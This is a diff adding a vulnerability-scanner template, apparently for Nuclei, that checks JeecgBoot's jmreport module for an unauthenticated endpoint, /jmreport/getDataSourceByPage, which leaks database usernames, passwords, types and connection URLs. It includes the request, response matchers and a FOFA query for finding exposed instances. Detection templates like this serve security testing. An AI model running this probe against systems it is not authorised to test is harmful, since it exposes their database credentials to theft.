@@ -1,0 +1,37 @@
+id: jeecg-getdatasourcebypage-disclosure
+
+info:
+  name: "JeecgBoot GetDataSourceByPage 接口信息泄露"
+  author: zan8in
+  severity: high
+  description: |
+    JeecgBoot jmreport 模块存在未授权接口，
+    可通过 /jmreport/getDataSourceByPage 获取数据库连接信息，
+    包括用户名、密码、数据库类型和连接地址。
+    fofa: app="jeecg-boot"
+  tags: jeecgboot
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jmreport/getDataSourceByPage"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"dbUsername":'
+          - '"dbPassword":'
+          - '"dbType":'
+          - '"dbUrl":'
